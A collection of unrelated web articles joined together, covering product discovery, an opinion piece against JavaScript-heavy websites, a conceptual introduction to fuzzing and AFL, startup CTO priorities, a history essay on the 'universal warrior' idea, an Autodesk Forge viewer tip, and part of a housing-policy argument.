product management best practices were formed. Back then, companies building websites and digital products spent a lot of time and money trying to convince customers that they needed their great products—but not so much time actually listening to them.</p><p>This led to a lot of very expensive failures, as products often made it to full release before their creators realized that people just didn’t need them. Over time, the development of customer-centric ideas—like the <a href="https://hbr.org/2016/09/know-your-customers-jobs-to-be-done" target="_blank" rel="noopener">Jobs to be done</a> framework, and early iterative testing based on user feedback—encouraged product teams to put themselves in their users’ shoes more, and to ask what they thought more often.</p><p>These days, we refer to this broad template of activities and approaches as ‘product discovery.’</p></div><p id="framework"><h2>A step-by-step product discovery framework</h2></p><div><p>There’s no singular, defined set of methods that you have to follow with product discovery—you could include customer feedback surveys, interviews, focus groups, journey mapping, insights from product analytics, and various types of <a href="https://maze.design/guides/usability-testing/" target="_blank" rel="noopener">usability testing</a> in your approach.</p><p>But whatever modern <a href="https://maze.co/guides/product-discovery/techniques/" target="_blank" rel="noopener">product discovery techniques</a> you end up using—more on that in chapter 4—the goals are always the same:</p><ul><li>Form a deep, upfront understanding of what your users need</li><li>Define and validate a solution based on your users’ input</li></ul><p>For this reason, it’s vital to approach product discovery with a mindset that’s open to all possibilities. You might start the process with a really cool idea for a product in the back of your mind, only to find out that your users don’t need a new product after all. Maybe a few specific improvements to your current product are enough. This kind of realization is all part of the ‘discovery’—it’s what makes product discovery both useful and interesting.</p><p>And while the exact methodology is up to you, to achieve your product discovery goals you should combine this open mindset with this basic, step-by-step product discovery framework:</p><h3>1. Learn &amp; understand</h3><p>Before you start thinking about what's next on your product roadmap or even decide which problem you want to solve, spend a decent amount of time communicating with users. Run customer interviews, organize user stories into themes, create journey maps, and form a close relationship with a group of users.</p><p>The information you learn here will help you hone in on pain points to build solutions for. You could spend weeks or months in this stage—however long it takes to start spotting clear themes in your users’ feedback.</p><h3>2. Define &amp; decide</h3><p>Once you’ve got a healthy amount of data and feedback, your team should take a step back and prioritize the most important problems for your users.</p><p>With problems prioritized, you should be able to form a clear, broad hypothesis that can form the foundation of the solutions you develop. This should be a short, simple sentence—often a question—that covers the main problem and related sub-problems you want to solve for your users. Here’s an example:</p><p><em>“Building a commenting feature will increase the amount of time users spend in our product.”</em></p><p>This sounds straightforward, but it will probably take you a few attempts. Take your time—it’s super important to get this part right, as your hypothesis will determine what you build.</p><h3>3. Ideate &amp; prioritize</h3><p>Next, it’s time to get creative and start thinking about what a new product idea might look like. Encourage your team to brainstorm without limits at first, then gradually narrow down to the best ideas. You could even do an ideation hackathon to get the whole team focused on the problem.</p><p>Once you have a few solid options, plan out how each solution could work in practice by assigning scores for predicted value and feasibility to build. There are many ways of prioritizing your options—<a href="https://www.productboard.com/glossary/product-prioritization-frameworks/">some very detailed</a>. The simplest way is the ICE framework: score each solution out of 10 for the Impact (I) it’ll have, your Confidence (C) that it’ll solve the problem, and the Ease (E) of building it, then compare the average scores to get a prioritized list.</p><h3>4. Prototype &amp; test</h3><p>The final stage of product discovery is where you can start prototyping new products or features. But don’t get too carried away—the idea is just to create some quick prototypes for user testing. You could make a working MVP (Minimum Viable Product), a mockup using a design tool, or even a paper prototype.</p><p>With your prototype done, now’s the time to reach out to users again. Run some <a href="https://maze.design/blog/prototype-testing/">prototype tests</a> and collect user feedback to find out if you're building the right product. If your users’ responses validate your hypothesis and early iteration, you’re ready to start development. If not, keep tweaking your prototypes until you’re confident that the solution you’re proposing is really what your users are looking for.</p></div><p id="benefits"><h2>The benefits of product discovery</h2></p><div><p>Like many best practices of modern product development, a lot of the product discovery process seems like common sense. But as the fall of Quibi shows, the benefits of investing time into product discovery are still often overlooked to this day. So let’s take a look at some of the main ones:</p><h4>You’ll save time &amp; money</h4><p>Product teams spending weeks or months doing a lot of thinking and not very much building might seem counterintuitive to the fast startup culture they exist in. The demands of key stakeholders to drive metrics and business goals by shipping new products is a constant pressure for most product teams.&nbsp;</p><p>But cutting corners with <a href="https://maze.design/guides/ux-research">user research</a> to press on with development is a massive—and very expensive—risk. You’re essentially gambling on assumptions about what your users want, which could turn out to be false no matter how experienced you are. Product discovery gives you validation on whether your product needs to exist before spending a lot of money building, polishing, and marketing it. It makes you more agile, not less.</p><p>Sebastien Phlix, Product Manager at N26, sums it up:</p></div><div><div><p color="blue500" font-size="4" font-weight="600" font-family="Public Sans, sans-serif">“Think about how much one two-week sprint costs. 10k? 20K?

<p>Published on <span id="pubdate">2021-01-24</span>.</p>
<p>For many years I have been advocating passionately against the so-called "modern web" as it is really nothing more than a poor excuse for not using your brain and instead following the hype and trends of stuffing web applications with unneeded JavaScript and slow and crappy frameworks. But now the time has come when soon the "modern web" will finally die.</p>

<p>Most people don't like to feel <a href="https://www.youtube.com/watch?v=o8BkzvP19v4">outside</a>, which is why the majority is always just following hype and trends. This is also why it is so easy for politicians and news media to fill people with lies.</p>

<p>If something is presented as "the right thing to do", most people want to do it. But what happens when the so-called right thing really doesn't make any sense, or the so-called right thing has obvious flaws? Truly independent thinking and responsible people gather information objectively and try to reach a conclusion without any consideration to social conformity, but most people are not truly independent thinking even though they like to believe they are.</p>

<p>Do you know how you can tell if you are really lying to yourself about why you do what you do? One crystal clear sign is if you are blindly following what the majority is doing without truly understanding the consequences of your actions. Another very clear sign is if you passionately and emotionally criticize the opposite opinion without any true personal experience or knowledge and then call what you do as being "modern", as if what you do is the right thing whereas what others are doing is hopelessly outdated.</p>

<p>The fact about the so-called modern web is that there has really never been any modern web. The hardware has become much faster, but that has nothing to do with the modern web. No, the truth is that the so-called modern web was invented as a term by people who like to feel important and smart. They did so by developing software and frameworks and then telling everyone else to stop "re-inventing the wheel" and instead use their clever solutions. And rather than evaluating the claims of these people objectively, the masses where swayed by all their impressive rhetoric's and their popularity.</p>

<p>The result has been absolutely mind bugling and ridicules because even though the real advance in technology has made the hardware many many times faster, both in processing power and data transfer speeds, the Internet has become absolutely stupidly slow. The main reason for that is all the webpages that gets stuffed with useless JavaScript and frameworks.</p>

<p>I have said it <a href="https://www.unixsheikh.com/articles/stop-pushing-javascript.html">before</a>, and I'll say it again: <strong>If you're pushing JavaScript as a dependency for your website to function, you'd better be serving some pretty amazing and special content, otherwise your website is just plain broken!</strong></p>

<p>Today data centers around the world are using more electricity than ever. It takes more than 50 power plants, each capable of generating 500 megawatts of electricity, to power all the data centers in operation in the U.S. alone. And this number will increase dramatically over the years if the current development model doesn't improve drastically.</p>

<p>My prediction is that in only a couple of years from now, it will be socially and environmentally unacceptable for any kind of company to have a high carbon footprint! And this doesn't mean that a company can simple go all green and start using windmills e.g. The reason for that is that even the production of windmills leaves a pretty high carbon footprint. No, what companies need to do is to reduce power consumption as much as possible. And when it comes to the software industry, then there is only one sure way forward, and that is to improve application performance as much as possible. This is especially important with gaming, web applications and other Internet related services such as gaming server applications. Video providers such as YouTube will eventually have to disallow content that doesn't generate any revenue for them because storage servers requires huge amounts of power.</p>

<p>I believe that in the near future companies will actually begin to compete with each other about who has the most performant applications, web or otherwise.</p>

<p>Just like responsible and grown up people don't throw trash on the street, responsible and grown up people also take care when they develop software. This is actually nothing new at all, it has just been ignored by the staggering careless approach of just "throwing more hardware at the problem because hardware is cheap". The fact is that hardware has never been cheap! Hardware production has always had a huge negative impact on the environment, not only in the form of carbon footprint during production, but also pollution and the thoughtless behavior of simply <a href="https://envibrary.com/electronic-pollution/">throwing away fully working machines</a>.</p>

<p>In 2018 electronic waste in America represented about 2% of the trash in landfills, but it equaled 70% of overall toxic waste.</p>

<p>In the near future public attention will drive government policy and carbon footprints will become a subject of worldwide scrutiny. Individuals, companies and countries will have to seek the fastest and most affordable ways to achieve a net-zero carbon footprint.</p>

<p>This will also mean that careless use of technology in web development, such as JavaScript and frameworks, needs to be a thing of the past and our current way of developing web applications will in the future look like the "dark ages".</p>

<p>For years I have worked as an independent contractor with a main focus on improving performance and security in web applications. My work has not been about throwing more hardware at the problems, but rather to remove hardware! This has been achieved in one very simple way each and every time: Remove all unnecessary JavaScript and re-build the application using a fast programming language without a framework and without stupid and slow design patterns. Absolutely no hype or trends allowed here!</p>

<p>I have argued for years against the irresponsible behavior of software developers who could care less about the future of a company by careless design choices, but for some strange reason many people believe that if you don't use a framework, then you have to reinvent the wheel each time you build something. But nobody does that! What you do instead is that you study and understand the technology you're using and then you put together small pieces of performant and reusable code and use that.</p>

<p>Other people argue against building web applications from the ground up because if you work in a team, then you need to read other peoples code, and without a framework, then nobody knows how to structure the code or understand what other people are doing. Well, guess what, that's what software development is about! Reading and understanding other peoples code, writing really good and quality documentation, commenting your code and following a clear and concise code style guide. If you cannot do that, then you shouldn't be a software developer. This is what we used to call "good programming".</p>

<p>It's time to take responsibility. Be a part of the solution, not the problem!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<h3><strong>Fuzzing</strong></h3>
<p>First of all, what is fuzzing exactly? When we fuzz test a program or function that receives input (any type of input), we try different combinations of input until we get a crush or another desired result (frequently memory leaks). When a program doesn’t sanitize its input properly, malformed or improper input might come from the user, which can cause crashes and strange or undefined behavior. A good example of fuzzing that you probably heard of before is <em>dirbusting</em>, when we try different URLs, first starting with common ones until we find legitimate directories in a website. Tools like <a href="https://github.com/ffuf/ffuf">fuff</a> do an excellent job at it.</p>
<p>Fuzzing is especially useful in programs written in low-level or older languages, like Basic, Assembly, C/C++, etc., that don’t prevent the programmer from writing mistakes like improper typecasting, use after free [of a pointer], or memory overflow (buffer, stack, integer), which normally don’t necessarily lead to crashes at runtime or compile-time errors and could be exploited by a shrewd attacker. Usually, when the term ‘fuzzing’ is mentioned, it refers to this type of fuzzing.</p>
<h2><strong>Types of Fuzzing</strong></h2>
<p>There are three approaches to fuzzing that we should enumerate.</p>
<h5>Whitebox Fuzzing</h5>
<p>By ‘whitebox fuzzing’ we refer to a type of fuzzing wherein the fuzzer attempts to analyze the internal structure of the program in order to track and maximize code coverage. Code coverage refers to the proportion of branches we reached in our code; every time a conditional statement like <em>if</em> or <em>while</em> is run, the code splits asunder into one branch where the statement is true, and another where it is false. The rationale is that if there’s an error hiding in some branch, we first must make sure that we reach that branch in the first place. To perform this kind of analysis, the program must be instrumented during compilation. </p>
<p>Instrumentation works by calling a special function every time a branch is run, which logs it as having been run, sometimes even to the resolution of which line, so that coverage could be tracked. Instrumentation could also help find bugs. For instance, Address Sanitation (ASan) helps find memory leaks that don’t normally cause crashes. Since full structural analysis requires a lot of resources, whitebox fuzzing is slow, but much more effective in finding bugs and vulnerabilities, especially ones hidden deep in the program. Of course In order to perform extensive instrumentation one must have access to the source code, which isn’t always available, especially as an attacker.</p>
<h5>Blackbox Fuzzing</h5>
<p>In this approach, on the other hand, we don’t care about the structure of the program, and treat it as a black box. Still, we can use the output of the program to try and figure out what happens inside and thus craft smarter and more efficient input. Since we avoid the overhead associated with whitebox fuzzing, blackbox fuzzing is much faster but less efficient in finding mistakes and vulnerabilities.</p>
<h5>Graybox Fuzzing</h5>
<p>This approach tries to strike a balance between the respective pros and cons of the aforementioned approaches; it uses light instrumentation during compile-time instead of a full analysis in order to calculate code coverage and track the program’s state. Most popular fuzzers today, like AFL, HongFuzz and LibFuzzer are graybox fuzzers. In order to execute such fuzzing, the source code is usually needed, but there are workarounds if only an executable is available, but they seriously harm performance. In this article I won’t touch on these techniques.</p>
<h2><strong>Techniques of Fuzzing</strong></h2>
<p>As in dirbusting, fuzzing need not be done using brute force, that is, trying random input. Indeed, brute force isn’t a good technique for fuzzing and this is rarely done. Fortunately, there are a number of smarter techniques that lead to better results in reasonable amounts of time and resources. Here I shall discuss two of them:</p>
<h5>Mutation-based Fuzzing </h5>
<p>This technique is based on greybox fuzzing. We start with legitimate well-formed input and apply a couple of types of mutations on it. Using instrumentation, we try to take the most successful mutations, which reveal new branches, and use them as seed for the next generation. This process is somewhat reminiscent of Darwinian natural selection that we see in nature. We also have the useful side effect that mutations that are filtered by the program go out of use and we are left with only working input.</p>
<p>The most well-known tool (and arguably the most well known fuzzer in general) is <a href="https://github.com/google/AFL">AFL</a>, or American Fuzzy Lop.</p>
<p>AFL uses three types of basic mutations:</p>
<ul><li>Deletion of a random bit.</li><li>Insertion of a random bit.</li><li>Flipping of a random bit (from 0 to 1 or conversely)</li></ul>
<p>AFL doesn’t work with only one mutation at any given time, but distributes its resources between a couple of them, and prefers the ones with the most <em>energy</em>. The energy of each mutation is based on which branches in the code it runs – rarer branches, that most input passes, are assigned more energy. Each branch has a unique hash, and this allows tracking the number of executions. It’s important to mention that the initial input in this technique can come from a dictionary containing more than one variation.</p>
<h5>Grammatical Fuzzing</h5>
<p>You are probably aware that many programs cannot receive unstructured input, but have specific rules on how input can be formed. These rules are called the syntax of the input, since they are similar to syntactical rules in spoken languages. In order to fuzz test such programs in a way that covers most syntactical options, the fuzzer must be aware of the syntax, otherwise, input produced using simple mutations would be filtered and discarded. Such fuzzers already exist, and can fuzz JavaScript, WASM, URL and others. but as of the writing of this article, most of them are all experimental and slow, and as far as I know, all are written in Python, which is great for prototyping and demos, but not so much for optimized production-grade fuzzers. Therefore, they are rarely used.</p>
<h2><strong>Next – Part 2</strong></h2>
<p>In the next chapter “<a href="https://sayfer.io/blog/fuzzing-part-two-fuzzing-with-afl">Fuzzing with AFL</a>“, I demonstrate how to fuzz a simple program using AFL to find crashes that might be dangerous in the real world.</p>

<p>Startup leadership roles are unusual because the job changes so rapidly. Someone doing the role of CEO or CTO when the company is founded will find themselves doing something very different 18 months later. </p>



<blockquote><p>When hiring executives, look for people who have the experience and background that would make them a good fit or hire for the next 12–18 months. Anything shorter than that and they will not be able to scale sufficiently far relative to the time it takes to hire them. Anything longer and you will over-hire and end up with someone who is a bad fit for the job.</p><cite>Gil, Elad. High Growth Handbook (p. 119)</cite></blockquote>



<p>The startup CTO is usually the founder with the best technology background and they will usually be the one leading the development of the initial product. However, the word “Technology” in the title is misleading because it is not the most important part.</p>



<p>For early stage startups seeking product market fit, the CTO’s one job is to figure out how to hit the business milestones using technology. Understanding the business is what differentiates the CTO from a software engineer. This means setting up the technology team and processes to iterate quickly based on feedback from commercial interactions with early customers.</p>



<p>The early stage CTO must be comfortable with technical debt and inefficient processes. They need to be able to make the tradeoff between building the perfect technical architecture and creating something good enough. They must understand what is built in the early months is unlikely to survive for long, and most of the codebase will be rewritten at some point. However, they must also <a href="https://davidmytton.blog/rewriting-refactoring-rearchitecting-when-is-the-right-time/">decide when it’s right to do that rewriting and refactoring</a>, which is never in the early stages of startup life and <a href="https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/">never the whole codebase in one go</a>.</p>



<p>The early stage startup CTO only focuses on the one or two elements that truly differentiate the company, and outsources everything else to SaaS or cloud products. This means using cloud services, not building your own. It means creating a monolithic codebase rather than hundreds of microservices. It means tying together 3rd party services and paying with cash rather than time. Later, it means deciding which services to bring in-house and which to just keep paying for. Netflix <a href="https://openconnect.netflix.com/en_gb/">runs their own CDN</a> because this is core to their business, but everything else is run on AWS. The early stage startup CTO has to figure this out for their own business.</p>



<p>Developer productivity is affected by bad code and reliability (redundancy, tests, deploys) requires investment. The early stage startup CTO has to decide what is critical to build now and what can wait. The priority is proving whether the business is viable. </p>



<p>It’s an uncomfortable state to be in – chaos – but the early stage startup CTO will know that it only lasts for a short time. Unless the product is in a regulated industry or safety critical, these tradeoffs have to be made because money and time are so limited. Think of the <a href="https://en.wikipedia.org/wiki/Twitter#Outages">reliability problems of early Twitter</a>, or the <a href="https://slack.engineering/reducing-slacks-memory-footprint-4480fec7e8eb">poor client performance of Slack</a>. These annoyed users but in the end didn’t negatively affect the outcome. </p>



<p>If the product is compelling enough, users will accept rough edges for a period of time. “<a href="https://davidmytton.blog/rewriting-refactoring-rearchitecting-when-is-the-right-time/">How long?</a>” is another difficult question the early stage startup CTO has to answer.</p>



<p>Only as the company scales (in terms of people and revenue) will the CTO start to think about the Technology element of their title. This will include helping teams make technical and architectural decisions as well as building the management structures around how engineering is run. Eventually, a new role – VP, Engineering – splits off to focus on the people:</p>



<blockquote><p>A VP Engineering is ideally a great manager and a great team builder. He or she will be an excellent recruiter, a great communicator, and a great issue resolver. The VP Eng’s job is to make everyone in the engineering organization successful and he or she needs to fix the issues that are getting in the way of success.</p><p>A CTO is ideally the strongest technologist in the organization. He or she will be an architect, a thinker, a researcher, a tester and a tinkerer. The CTO is often the technical co-founder if there is one (and you know I think there must be one).</p><cite><a href="https://avc.com/2011/10/vp-engineering-vs-cto/">VP Engineering vs CTO</a></cite></blockquote>



<p>Until then, the only thing the CTO should be focused on is <a href="http://www.startuplessonslearned.com/2008/09/what-does-startup-cto-actually-do.html">using technology to enable the startup business goals</a>. Business, through technology. Everything else is secondary.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the first part of a three part (II, III) discussion of an idea I am going to term (<a href="https://stevenpressfield.com/2021/01/warrior-episode-forty-one/">borrowing from one of its proponents</a>) the ‘universal warrior’ – the idea that there is a transcendent sameness about either the warrior experience or warrior values which provides some sort of useful blueprint for today or a fundamental truth about viewing the past (it is generally presented as both).</p>



<p>Of course the ‘universal warrior’ is not meant literally; no one, <a href="https://theimaginativeconservative.org/2016/05/through-a-glass-darkly-george-s-patton.html">save George S. Patton</a>, is claiming that a single warrior was reincarnated through a host of battles, always the same in each case.  <strong>Rather, the claim that there is a ‘universal warrior’ is really a claim that there is a universal <em>war experience</em></strong>, which all combatants in all wars take part of and which remains largely unchanged or that there is fundamentally a <strong>universal set of warrior values, behaviors or attributes</strong> which define combatant through the ages and through different kinds of armies, different kinds of service</p>



<p>And that notion is a popular one, appearing equally at home in <a href="https://youtu.be/A50lVLtSQik">anti-war songs</a> and <a href="https://angrystaffofficer.com/2016/12/14/stop-calling-us-warriors/">military recruitment propaganda </a>(along with<a href="https://youtu.be/62tnJtLBQzQ"> lava monsters</a>).  Most recently, my attention was drawn to it by a series of what are effectively <a href="https://stevenpressfield.com/category/the-warrior-archetype/">self-help videos</a> framed around the idea by best-selling author Steven Pressfield and I am going to use those videos as the clear form of the argument I want to engage.  In part, this is because Pressfield makes the argument in almost all of its fullness, making many of the implications (‘warrior societies,’ the life advice, the transcendent connection between ‘warriors’ past and present, the implication that ‘warrior’ life is more morally pure and so on) explicit and clear.  And also because Pressfield’s books – <a href="https://www.reddit.com/r/AskHistorians/comments/7rdgm4/how_accurate_is_the_depiction_of_spartan_hoplite/">his <em>fiction</em> I should note, for his historical fiction works have at best a tenuous relationship with the historical record</a> – are, among other things, <em><a href="https://en.wikipedia.org/wiki/Gates_of_Fire">on officer training reading lists</a></em> making it a rather important thing if he is peddling an utterly bunk notion of the past.</p>



<p>And it is not hard to see why the idea of a universal warrior value set or a universal warrior experience is an attractive notion; it offers a transcendent connection, linking the experience of combat – whether that is understood positively, as Pressfield does, or negatively as the famous song does – across generations, centuries and cultures.  And it offers the promise of turning that feeling of transcendent connection into a sense of heroism in everyday life, a blueprint for self-improvement, or a timeless model for political consciousness.</p>



<p>And it <em>feels</em> true.  After all, we call people who fought in wars even at the beginnings of written history ‘soldiers’ and ‘warriors and we call our own war-fighters ‘soldiers’ and (unfortunately) ‘warriors.’  That suggestion of equivalence is built right into our linguistic systems.  Students often marvel at the ludicrous tendency for historical artists to represent conflicts in their own deep past (like medieval manuscript illustrators depicting conflicts from classical antiquity) using present (to them) day arms, armor and tactics.  But those same students will often almost immediately fall into the mistake of assuming that combatants of the past shared the same <a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/">attitudes </a>and <a href="https://acoup.blog/2020/04/10/collections-antarah-ibn-shaddad-victory-songs/">motivations </a>about war as they do.</p>



<p><strong>Of course a lot of things <em>feel</em> true which aren’t</strong>.  Standing on the ground, the Earth <em>feels</em> flat, it <em>seems</em> the Sun moves across the sky; of course in reality, the Earth is a ball and in a real sense the sky moves across the Sun.  Many things are <em>intuitive</em>, they <em>feel</em> true, without <em>being</em> true.  <strong>So is there a universal combat experience?</strong></p>



<p>To probe that question, we are going to examine it in two ways. <strong> This week, we’re going to look at the <em>kinds</em> of people in war, what the distinctions are between them and if their experience really can be universally applied</strong>.  Then next week, we’re going to look at this question culturally and chronologically, asking if the experience of the same kinds of people in war was really the same in <em>different wars</em>, drawing heavily on the social-military-history lens which concerns itself with the experience of battle (often called the <em>Face of Battle</em>-school after J. Keegan’s <em>The Face of Battle </em>(1976)).  Then the week after that we’ll take a look at the implications (particularly for how manliness and masculinity are understood) that this historical theory and its failures have on the broader cultural constructs built around it.</p>



<p>Because – spoiler alert –<strong> there is no universal warrior </strong>(in case some of you were concerned that I was going to spend two weeks carefully explaining different categories only to conclude that they were meaningless!) and <strong>there is no universal combat experience</strong>.</p>

<p>Alright?  Let’s soldier on!</p>



<h2>Soldiers and Warriors</h2>



<p>We want to start with asking what the distinction is between <em>soldiers</em> and <em>warriors</em>. <a href="https://angrystaffofficer.com/2016/12/14/stop-calling-us-warriors/"> It is a tricky question </a>and even the <a href="https://youtu.be/7TprgnuYfyQ">U.S. Army sometimes gets it badly wrong</a> (Pressfield, I should note, draws a distinction which isn’t <em>entirely</em> wrong but is so wrapped up with <a href="https://stevenpressfield.com/2020/09/warrior-episode-seven/">his dodgy effort to use discredited psychology</a> that I think it is best to start from scratch).  We have a sense that while both of these words mean ‘combatant,’ that they are not quite equivalent.</p>



<p>I suspect many of my readers (specifically the native English speakers) will immediately agree, for instance, that this fellow is a warrior, but not a soldier:</p>

<p><strong>But <em>why</em>?</strong>  The etymologies of the words can actually help push us a bit in the right direction.  Warrior has a fairly obvious etymology, being related to war (itself a derivative of French <em>guerre</em>); as <em>guerre </em>becomes war, so Old French <em>guerreieor</em> became Middle English <em>werreior</em> and because that is obnoxious to say, modern English ‘warrior’ (which is why it is warrior and not ‘warrer’ as we might expect if it was regularly constructed).  By contrast, soldier comes – it has a tortured journey which I am simplifying – from the <em>sold/sould</em> French root meaning ‘pay’ which in turn comes from Latin <em>solidus</em>, a standard Late Roman coin.  So there is clearly something about pay, or the lack of pay involved in this distinction, but clearly it isn’t <em>just</em> pay or the word mercenary would suit just as well.</p>



<p>So here is the difference: <strong>a warrior is an individual who wars, because it is their foundational vocation</strong>, an irremovable part of their identity and social position, pursued for those private ends (status, wealth, place in society).  <strong>So the core of what it is to be a warrior is that it is an element of personal identity and also fundamentally individualistic</strong> (in <em>motivation</em>, to be clear, not in fighting style – many warriors fought with collective tactics, although I think it fair to say that operation in units is much more central to soldiering than the role of a warrior, who may well fight alone).  A warrior remains a warrior when the war ends.  A warrior remains a warrior if fighting alone or for themselves.</p>



<p>By contrast, a soldier is an individual who <em>soldiers</em> (notably a different verb, which includes a sense of drudgery in war-related jobs that aren’t warring <em>per se</em>) as a <em>job</em> which they may one day leave behind, under the authority of and pursued for a larger community which directs their actions, typically through a system of regular discipline.  <strong>So the core of what it is to be a soldier is that it is a not-necessarily-permanent employment and fundamentally build about being both in and in service to a group.  </strong>A soldier, when the war or their term of service ends, becomes a civilian (something a warrior generally does not do!).  A soldier without a community stops being a soldier and starts being a mercenary.</p>



<p>Incidentally, this distinction is not unique to English.  Speaking of the two languages I have the most experience in, both Greek and Latin have this distinction.  Greek has <em>machetes </em>(<em>μαχητής</em>, lit: ‘battler,’ a <em>mache</em> being a battle) and <em>polemistes</em> (πολεμιστής, lit: ‘warrior,’ a <em>polemos</em> being a war); both are more common in poetry than prose, often used to describe mythical heroes.  Interestingly the word for an individual that fights <em>out of battle order</em> (when there is a battle order) is a <em>promachos</em> (πρόμαχος, lit: ‘fore-fighter’), a frequent word in Homer.  But the standard Greek soldier wasn’t generally called any of these things, he was either a <em>hoplite</em> (ὁπλίτης, ‘full-equipped man,’ named after his equipment) or more generally a <em>stratiotes</em> (στρατιώτης, lit, ‘army-man’ but properly ‘soldier’).  That general word, <em>stratiotes</em> is striking, but its root is <em>stratos</em> (στρατός, ‘army’); a <em>stratiotes</em>, a soldier, for the ancient Greeks was defined by his membership in that larger unit, the army.  One could be a <em>machetes</em> or a <em>polemistes</em> alone, but only a <em>stratiotes</em> in an army (<em>stratos</em>), commanded, presumably, by a general (<em>strategos</em>) in service to a community.</p>



<p>Latin has the same division, with similar shades of meaning.  Latin has <em>bellator</em> (‘warrior’) from <em>bellum</em> (‘war’), but Roman soldiers are not generally <em>bellatores</em> (except in a poetic sense and even then only rarely), even when they are actively waging war.  Instead, the soldiers of Rome are <em>milites</em> (sing. <em>miles</em>).  The word is related to the Latin <em>mille</em> (‘thousand’) from the root ‘mil-‘ which indicates a collection or combination of things.  <em>Milites</em> are thus – like <em>stratiotes</em>, <strong>men put together</strong>, defined by their collective action for the community (strikingly, groups acting for individual aims in Latin are not <em>milites</em> but <em>latrones</em>, bandits – a word Roman authors also …</p></div></div>

<p><a href="https://forge.autodesk.com/">Autodesk Forge</a> has a nice feature known as section hatches. This feature fills out (or caps) parts of the model that is cut out by the section plane with a hatch pattern. You can see this in action below, when a z-plane cuts across the building:</p>



<figure><img loading="lazy" width="1024" height="503" src="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-1024x503.png" alt="" srcset="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-1024x503.png 1024w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-300x147.png 300w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-768x378.png 768w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-1536x755.png 1536w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a-1200x590.png 1200w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/0a.png 1599w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The addition of hatches helps the viewer to see which parts of the model are cut out. </p>



<p>However, there is a problem with section hatches on some models, such as this:</p>



<figure><img loading="lazy" width="1024" height="504" src="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-1024x504.png" alt="" srcset="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-1024x504.png 1024w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-300x148.png 300w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-768x378.png 768w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-1536x756.png 1536w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1-1200x591.png 1200w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/1.png 1598w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The left part of the building is wrongly covered by the hatch and there are some weird triangulation problems on the right. This could happen when the meshes in the model is not 2-manifold. </p>



<p>Starting with Forge Viewer v7.35, there is a new option to turn off section hatches. It is located in the Configuration tab under Settings.</p>



<div><figure><img loading="lazy" width="389" height="652" src="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/3.png" alt="" srcset="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/3.png 389w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/3-179x300.png 179w" sizes="(max-width: 389px) 100vw, 389px"></figure></div>



<p>When you turn off section hatches, you still get the clipping, but without the potential artifacts:</p>



<figure><img loading="lazy" width="1024" height="505" src="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-1024x505.png" alt="" srcset="https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-1024x505.png 1024w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-300x148.png 300w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-768x379.png 768w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-1536x758.png 1536w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2-1200x592.png 1200w, https://tongwing.woon.sg/blog/wp-content/uploads/2021/01/2.png 1595w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>You can also programmatically enable this behaviour by calling:</p>



<p><code>viewer.prefs.set(Autodesk.Viewing.Private.Prefs3D.DISPLAY_SECTION_HATCHES, false)</code></p>



<p>As a side benefit, performance is improved slightly with section hatching turned off.</p>



<p>If you are interested in the algorithms behind filling (or capping) of clipped mesh – though not necessarily the one implemented by Forge – you can refer to <a href="https://www.scitepress.org/papers/2017/60972/60972.pdf">this</a> and <a href="https://www.geometrictools.com/Documentation/ClipMesh.pdf">this</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today I want to talk about an idea that I don’t think has much purchase in real-world politics but seems to loom large both on the internet and in academic circles — the idea that new real estate development activity actually <em>causes gentrification</em> through some kind of induced demand phenomenon. </p><p>Nathan Robinson in his <a href="https://www.currentaffairs.org/2021/01/the-only-thing-worse-than-a-nimby-is-a-yimby">anti-YIMBY screed</a> explores a scenario in which replacing smaller buildings with larger ones increases housing scarcity even while adding units because “we're luring rich people from elsewhere to our city.” He’s doing a thought-experiment, but clearly one he thinks is plausible, while <a href="https://shelterforce.org/2018/11/05/heres-what-we-actually-know-about-market-rate-housing-development-and-displacement/">Amee Chew</a> in a 2018 Shelterforce article states that “numerous studies show that market-rate housing development has price ripple effects on surrounding neighborhoods, driving up rents and increasing the burden on lower-income households.”</p><p>Chew’s studies don’t really say that (more on this later) but the studies do say what I also know from personal experience which is that people living through a gentrification process often <em>say</em> this is what’s going on. This is all exacerbated by the fact that many people, as in this recent Washington Post article about Mt Pleasant, <em>define</em> gentrification as the presence of new-built condos with chain store retail on the ground floor. And it is definitely true that if what you mean by “gentrification” is “new buildings and chain stores” then blocking new buildings and chain stores will block gentrification.</p><p>But the argument here is supposed to be about prices, displacement, and ultimately people’s living standards. </p><p>And the induced demand objection fails on four scores:</p><ul><li><p>It is empirically false, at least most of the time. </p></li><li><p>Accepting its logic would counsel against <em>all</em> efforts to improve quality of life.</p></li><li><p>If it were true, it still wouldn’t follow that new construction is bad.</p></li><li><p>It misconstrues what the 